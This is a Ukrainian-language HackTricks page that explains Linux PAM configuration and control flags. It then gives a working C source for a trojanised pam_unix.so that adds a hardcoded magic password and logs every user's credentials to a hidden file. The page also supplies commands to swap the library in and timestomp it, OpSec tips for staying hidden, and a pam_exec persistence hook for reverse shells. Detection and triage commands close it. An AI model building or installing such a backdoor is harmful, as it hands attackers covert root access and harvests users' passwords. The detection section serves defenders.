# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** діє як механізм безпеки, який **перевіряє особу користувачів, що намагаються отримати доступ до комп'ютерних сервісів**, контролюючи їхній доступ на основі різних критеріїв. Це схоже на цифрового привратника, який гарантує, що лише авторизовані користувачі можуть взаємодіяти з певними сервісами, водночас потенційно обмежуючи їх використання, щоб запобігти перевантаженню системи.

#### Файли конфігурації

- **Solaris and UNIX-based systems** зазвичай використовують центральний файл конфігурації, розташований за адресою `/etc/pam.conf`.
- **Linux systems** віддають перевагу підходу на основі директорій, зберігаючи конфігурації, специфічні для сервісів, у `/etc/pam.d`. Наприклад, файл конфігурації для сервісу login знаходиться за адресою `/etc/pam.d/login`.

Приклад конфігурації PAM для сервісу login може виглядати так:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Сфери керування PAM**

Ці області, або групи керування, включають **auth**, **account**, **password** та **session**, кожна з яких відповідає за різні аспекти процесу автентифікації та керування сесією:

- **Auth**: Перевіряє ідентичність користувача, часто запитуючи пароль.
- **Account**: Виконує перевірку облікового запису, перевіряє такі умови, як членство в групі або обмеження за часом доби.
- **Password**: Керує оновленнями паролів, включаючи перевірку складності та запобігання атакам зі словника.
- **Session**: Керує діями при початку або завершенні сеансу сервісу, наприклад монтуванням директорій або встановленням обмежень ресурсів.

#### **Керування модулями PAM**

Контролі визначають реакцію модуля на успіх або помилку, впливаючи на загальний процес автентифікації. Вони включають:

- **Required**: Невдача обов'язкового модуля призводить до остаточної відмови, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайне припинення процесу при помилці.
- **Sufficient**: Успіх дозволяє обійти інші перевірки тієї ж області, якщо лише наступний модуль не зазнає невдачі.
- **Optional**: Призводить до відмови лише якщо це єдиний модуль у стеку.

#### Приклад сценарію

У налаштуванні з кількома **auth** модулями процес виконується у суворому порядку. Якщо модуль `pam_securetty` виявляє, що термінал входу не авторизований, входи під root блокуються, але всі модулі все одно обробляються через його статус "required". Модуль `pam_env` встановлює змінні середовища, що може покращити досвід користувача. Модулі `pam_ldap` і `pam_unix` працюють разом для автентифікації користувача, причому `pam_unix` намагається використати раніше введений пароль, підвищуючи ефективність і гнучкість методів автентифікації.


## Backdooring PAM – Hooking `pam_unix.so`

Класичний прийом для забезпечення стійкого доступу у цінних Linux-середовищах — це **swap the legitimate PAM library with a trojanised drop-in**. Оскільки кожний SSH / консольний вхід викликає `pam_unix.so:pam_sm_authenticate()`, кількох рядків на C достатньо, щоб зняти облікові дані або реалізувати *magic* password bypass.

### Шпаргалка компіляції
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Скомпілювати та приховано замінити:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – записуйте у тимчасовий файл і `mv` на місце, щоб уникнути напівзаписаних бібліотек, які можуть заблокувати SSH.
2. Розміщення файлу журналу, наприклад `/usr/bin/.dbus.log`, зливається з легітимними артефактами робочого столу.
3. Зберігайте експорти символів ідентичними (`pam_sm_setcred`, тощо), щоб уникнути неправильного поводження PAM.

### Виявлення
* Порівняйте MD5/SHA256 файлу `pam_unix.so` з пакетом дистрибутива.
* `rpm -V pam` or `debsums -s libpam-modules` для виявлення замінених бібліотек без ручного хешування.
* Перевірте наявність world-writable або незвичного власника під `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Перевірте конфігурації PAM на несподівані модулі: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Швидкі команди для триажу (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Зловживання `pam_exec` для стійкого доступу
Замість заміни `pam_unix.so`, менш радикальним підходом є додати рядок `pam_exec` до `/etc/pam.d/sshd`, щоб кожний SSH-вхід запускав імплант, залишаючи при цьому звичайний стек недоторканим:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` запускається від root у PAM-контексті sshd, тому скрипт може ініціювати reverse shells, зібрати env vars або повторно відкрити implanted sockets без змін файлової системи чи основних бібліотек.


## References

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
